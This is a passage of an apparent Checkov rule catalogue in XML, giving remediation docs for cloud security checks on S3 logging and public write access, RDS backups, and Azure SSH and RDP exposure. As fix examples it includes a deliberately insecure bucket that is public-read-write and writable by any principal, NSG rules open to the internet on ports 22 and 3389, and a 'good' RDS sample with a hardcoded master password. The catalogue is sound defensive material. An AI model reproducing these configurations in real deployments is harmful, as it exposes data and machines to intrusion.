<li>Navigate to the <em>Bucket name list</em>.</li>
<li>To enable server access logging for a bucket, select the name of the bucket.</li>
<li>Click <strong>Properties</strong>.</li>
<li>Click <strong>Server access logging</strong>.</li>
<li>Click <strong>Enable Logging</strong>. </li>
</ol>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Notes</p></h3><ul>
<li>For the target, select the name of the bucket that you want to receive the log record objects. </li>
<li>The target bucket must be in the same <strong>Region</strong> as the source bucket and must not have a default retention period configuration. </li>
</ul></blockquote>
<ol start="8">
<li>Click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>The example below sets the logging policy for MyBucket.<br/>
The AWS user <em><a class="__cf_email__" data-cfemail="e3818c81a3869b828e938f86cd808c8e" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a></em> will have full control over the log files, no one else has any access. </p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">S3 logging</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-python theme-light" data-lang="python" name="S3 logging">### First, grant S3 permission with put-bucket-acl:
aws s3api put-bucket-acl --bucket MyBucket --grant-write URI=http://acs.amazonaws.com/groups/s3/LogDelivery --grant-read-acp URI=http://acs.amazonaws.com/groups/s3/LogDelivery
    
### Then apply the logging policy:
aws s3api put-bucket-logging --bucket MyBucket --bucket-logging-status file://logging.json

### logging.json is a JSON document in the current folder that contains the logging policy:
{
  "LoggingEnabled": {
    "TargetBucket": "MyBucket",
    "TargetPrefix": "MyBucketLogs/",
    "TargetGrants": [
      {
        "Grantee": {
          "Type": "AmazonCustomerByEmail",
          "EmailAddress": "<a class="__cf_email__" data-cfemail="5c3e333e1c39243d312c3039723f3331" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
        },
        "Permission": "FULL_CONTROL"
      }
    ]
  }
}
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_s3_bucket</li>
<li><strong>Argument:</strong> logging. This example uses a dynamic block to enable the feature, the purpose here is to be able to add or not logging details by making a list of 0 or more entries.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.bucket.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.bucket.tf">resource "aws_s3_bucket" "bucket" {
  acl    = var.s3_bucket_acl
  bucket = var.s3_bucket_name
  policy = var.s3_bucket_policy

  force_destroy = var.s3_bucket_force_destroy
  versioning {
    enabled    = var.versioning
    mfa_delete = var.mfa_delete
  }

+  dynamic "logging" {
+    for_each = var.logging
+    content {
+      target_bucket = logging.value["target_bucket"]
+      target_prefix = "log/${var.s3_bucket_name}"
+    }
+  }
}
</code></pre></div></div>
<p>Alternatively you could just always define the logging block:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_s3_bucket" "bucket" {
  acl    = var.s3_bucket_acl
  bucket = var.s3_bucket_name
  policy = var.s3_bucket_policy

  force_destroy = var.s3_bucket_force_destroy
  versioning {
    enabled    = var.versioning
    mfa_delete = var.mfa_delete
  }

+  logging {
+      target_bucket = var.target_bucket
+      target_prefix = "log/${var.s3_bucket_name}"
+   }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/s3_13-enable-logging' target='_blank'> https://docs.bridgecrew.io/docs/s3_13-enable-logging</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/s3_13-enable-logging' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_8</key>
    <name>Ensure RDS clusters have an AWS Backup backup plan</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="rds-clusters-do-not-have-an-aws-backup-backup-plan"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-rds-clusters-do-not-have-an-aws-backup-backup-plan"></div>RDS clusters do not have an AWS Backup backup plan</div><a aria-label="Skip link to RDS clusters do not have an AWS Backup backup plan" class="heading-anchor-icon fa fa-anchor" href="#rds-clusters-do-not-have-an-aws-backup-backup-plan"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_rds_cluster, aws_backup_plan, aws_backup_selection</li>
<li><strong>Argument:</strong> <em>plan_id</em> and <em>resources</em> </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_rds_cluster" "rds_cluster_good" {
  cluster_identifier      = "aurora-cluster-demo"
  engine                  = "aurora-mysql"
  engine_version          = "5.7.mysql_aurora.2.03.2"
  availability_zones      = ["us-west-2a", "us-west-2b", "us-west-2c"]
  database_name           = "mydb"
  master_username         = "foo"
  master_password         = "bar"
}


resource "aws_backup_plan" "example" {
  name = "tf_example_backup_plan"

  rule {
    rule_name         = "tf_example_backup_rule"
    target_vault_name = "vault-name"
    schedule          = "cron(0 12 * * ? *)"
  }
}

resource "aws_backup_selection" "backup_good" {
  iam_role_arn = "arn:partition:service:region:account-id:resource-id"
  name         = "tf_example_backup_selection"
  plan_id      = aws_backup_plan.example.id

  resources = [
    aws_rds_cluster.rds_cluster_good.arn
  ]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-rds-clusters-has-backup-plan-of-aws-backup' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-rds-clusters-has-backup-plan-of-aws-backup</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-rds-clusters-has-backup-plan-of-aws-backup' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_57</key>
    <name>Ensure AWS S3 bucket is not publicly writable</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-s3-bucket-is-publicly-writable"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-s-3-bucket-is-publicly-writable"></div>AWS S3 bucket is publicly writable</div><a aria-label="Skip link to AWS S3 bucket is publicly writable" class="heading-anchor-icon fa fa-anchor" href="#aws-s3-bucket-is-publicly-writable"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Unprotected S3 buckets are one of the major causes of data theft and intrusions. An S3 bucket that allows <strong>WRITE</strong> access to everyone allows attackers to create, overwrite and delete objects within the bucket, which can lead to: S3 data loss, unintended changes to applications using that bucket, and unexpected charges. The only S3 buckets that should be globally accessible for unauthenticated users or for <strong>Any AWS Authenticate Users</strong> are those used for hosting static websites. Bucket ACL helps manage access to S3 bucket data. </p>
<p>We recommend AWS S3 buckets are not publicly accessible for <strong>WRITE</strong> actions to protect S3 data from unauthorized users and exposing sensitive data to public access. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="procedure"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-procedure"></div>Procedure</div><a aria-label="Skip link to Procedure" class="heading-anchor-icon fa fa-anchor" href="#procedure"></a></h2>
<p>S3 buckets should be protected by using the bucket ACL and bucket policies. If you want to share data with other users via S3 buckets, you could create pre-signed URLs with a short expiration duration. </p>
<p>To generate a pre-signed URL for the file <em>samplefile.zip</em>, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">aws s3 presign --expires-in 36000 s3://sharedfolder/samplefile.zip
</code></pre>
<p>To generate pre-signed URLS for every object in an S3 bucket, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">aws s3 ls --recursive s3://sharedfolder | awk '{print $4}' | 
while read line; do aws s3 presign --expires-in 36000 s3://sharedfolder/$line; done
</code></pre>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>For all automation-related work use the bucket policy and grant access to the required roles.</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::S3::Bucket</li>
<li><strong>Argument:</strong> Properties.AccessControl</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: AWS::S3::Bucket
    Properties:
        ...
-     AccessControl: PublicReadWrite
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime-1"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime-1"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_s3_bucket</li>
<li><strong>Argument:</strong> acl</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.fail.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.fail.tf">resource "aws_s3_bucket" "fail" {
  - acl    = "public-read-write"
  bucket = "superfail"

  versioning {
    enabled    = false
    mfa_delete = false
  }

  policy = &lt;&lt;POLICY
{
  "Version":"2012-10-17",
  "Statement":[
    {
      "Sid":"AddCannedAcl",
      "Effect":"Allow",
      "Principal": {"AWS": ["*"]},
      "Action":["s3:PutObject","s3:PutObjectAcl"],
      "Resource":"arn:aws:s3:::DOC-EXAMPLE-BUCKET/*",
      "Condition":{"StringEquals":{"s3:x-amz-acl":["public-read"]}}
    }
  ]
}
POLICY
}
</code></pre></div></div>
<p>Replace the acl with "private" instead of "public-read-write", or remove entirely as the default is private.</p> <br/> <a href='https://docs.bridgecrew.io/docs/s3_2-acl-write-permissions-everyone' target='_blank'> https://docs.bridgecrew.io/docs/s3_2-acl-write-permissions-everyone</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/s3_2-acl-write-permissions-everyone' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_1</key>
    <name>Ensure Azure instance authenticates using SSH keys</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-instance-does-not-authenticate-using-ssh-keys"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-instance-does-not-authenticate-using-ssh-keys"></div>Azure instance does not authenticate using SSH keys</div><a aria-label="Skip link to Azure instance does not authenticate using SSH keys" class="heading-anchor-icon fa fa-anchor" href="#azure-instance-does-not-authenticate-using-ssh-keys"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>SSH is an encrypted connection protocol that allows secure sign-ins over unsecured connections. SSH is the default connection protocol for Linux VMs hosted in Azure. Using secure shell (SSH) key pair, it is possible to spin up a Linux virtual machine on Azure that defaults to using SSH keys for authentication, eliminating the need for passwords to sign in.</p>
<p>We recommend connecting to a VM using SSH keys. Using basic authentication with SSH connections leaves VMs vulnerable to brute-force attacks or guessing of passwords. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Enter <strong>virtual machines</strong> in the search bar.</li>
<li>Under<strong> Services</strong>, select <strong>Virtual machines</strong>.</li>
<li>Under <strong>Administrator account</strong>, select <strong>SSH public key</strong>.</li>
<li>For <strong>SSH public key source</strong>, use the default <strong>Generate new key pair</strong>, then for <strong>Key pair name</strong> enter <strong>myKey</strong>.</li>
<li>Under <strong>Inbound port rules</strong> &gt; <strong>Public inbound ports</strong>, select <strong>Allow selected ports</strong>, then select <strong>SSH (22)</strong> and <strong>HTTP (80)</strong> from the drop-down.</li>
<li>Leave the remaining defaults settings. At the bottom of the page click <strong>Review + create</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>The --generate-ssh-keys parameter is used to automatically generate an SSH key, and put it in the default key location (~/.ssh). </p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">az vm create \
  --resource-group myResourceGroup \
  --name myVM \
  --image UbuntuLTS \
  --admin-username azureuser \
  --generate-ssh-keys
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_linux_virtual_machine</li>
<li><strong>Argument</strong>: admin_ssh_key</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_linux_virtual_machine" "example" {
  ...

+  admin_ssh_key {
    username   = "adminuser"
    public_key = file("~/.ssh/id_rsa.pub")
  }
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="arm-template"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-arm-template"></div>ARM Template</div><a aria-label="Skip link to ARM Template" class="heading-anchor-icon fa fa-anchor" href="#arm-template"></a></h2>
<ul>
<li><strong>Resource</strong>: Microsoft.Compute/virtualMachines</li>
<li><strong>Argument</strong>: disablePasswordAuthentication</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">...
      "linuxConfiguration": {
+       "disablePasswordAuthentication": "true",
        "ssh": {
          "publicKeys": [
            {
              "path": "string",
              "keyData": "string"
            }
          ]
 ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_networking_1' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_networking_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_networking_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_9</key>
    <name>Ensure RDP Internet access is restricted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="rdp-internet-access-is-not-restricted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-rdp-internet-access-is-not-restricted"></div>RDP Internet access is not restricted</div><a aria-label="Skip link to RDP Internet access is not restricted" class="heading-anchor-icon fa fa-anchor" href="#rdp-internet-access-is-not-restricted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>A potential security problem using RDP over the Internet is that attackers can use various brute force techniques to gain access to Azure Virtual Machines. Once the attackers gain access, they can use a virtual machine as a launch point for compromising other machines on the Azure Virtual Network. The attackers could also access and attack networked devices outside of Azure.</p>
<p>We recommend you disable RDP access over the internet to Network Security Groups.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>For each VM, open the <strong>Networking</strong> blade.</li>
<li>Verify that the<strong> INBOUND PORT RULES</strong> does not have a rule for RDP. For example:</li>
</ol>
<ul>
<li>Port = 3389</li>
<li>Protocol = TCP</li>
<li>Source = Any OR Internet</li>
</ul>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To list Network Security Groups with the corresponding non-default Security rules, use the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az network nsg list --query [*].[name,securityRules]</code></p>
<p>Ensure that the NSGs do not have any of the following security rules:</p>
<ul>
<li>"access" : "Allow"</li>
<li>"destinationPortRange" : "3389" or "*" or "[port range containing 3389]"</li>
<li>"direction" : "Inbound"</li>
<li>"protocol" : "TCP"</li>
<li>"sourceAddressPrefix" : "*" or "0.0.0.0" or "<!-- -->/0" or "/0" or "internet" or "any"</li>
</ul>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_network_security_rule</li>
<li><strong>Argument</strong>: access + protocol + destination_port_range + source_address_prefix</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_network_security_rule" "example" {
     ...
-    access                      = "Allow"
-    protocol                    = "TCP"
-    destination_port_range      = ["3389" / &lt;port range including 3389&gt;]]
-    source_address_prefix       = "*" / "0.0.0.0" / "&lt;nw&gt;/0" / "/0" / "internet" / "any"
     ...
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_networking_2' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_networking_2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_networking_2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_10</key>
    <name>Ensure SSH Internet access is restricted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="ssh-internet-access-is-not-restricted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-ssh-internet-access-is-not-restricted"></div>SSH Internet access is not restricted</div><a aria-label="Skip link to SSH Internet access is not restricted" class="heading-anchor-icon fa fa-anchor" href="#ssh-internet-access-is-not-restricted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>A potential security problem using SSH over the Internet is that attackers can use various brute force techniques to gain access to Azure Virtual Machines. Once the attackers gain access, they can use a virtual machine as a launch point for compromising other machines on the Azure Virtual Network. The attackers could also access and attack networked devices outside of Azure.</p>
<p>We recommend you disable SSH access over the internet to Network Security Groups.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>For each VM, open the <strong>Networking</strong> blade.</li>
<li>Verify that the<strong> INBOUND PORT RULES</strong> does not have a rule for SSH. For example:</li>
</ol>
<ul>
<li>Port = 22</li>
<li>Protocol = TCP</li>
<li>Source = Any OR Internet</li>
</ul>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To list Network Security Groups with corresponding non-default Security rules, use the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az network nsg list --query [*].[name,securityRules]</code></p>
<p>Ensure that the NSGs do not have any of the following security rules:</p>
<ul>
<li>"access" : "Allow"</li>
<li>"destinationPortRange" : "22" or "*" or "[port range containing 22]"</li>
<li>"direction" : "Inbound"</li>
<li>"protocol" : "TCP"</li>
<li>"sourceAddressPrefix" : "*" or "0.0.0.0" or "<!-- -->/0" or "/0" or "internet" or "any"</li>
</ul>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_network_security_rule</li>
<li><strong>Arguments</strong>: access + protocol + destination_port_range + source_address_prefix</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_network_security_rule" "example" {
-    access                      = "Allow"
-    protocol                    = "TCP"
-    destination_port_range      = ["22" / &lt;port range including 22&gt;]]
-    source_address_prefix       = "*" / "0.0.0.0" / "&lt;nw&gt;/0" / "/0" / "internet" / "any"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_networking_3' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_networking_3</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_networking_3' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
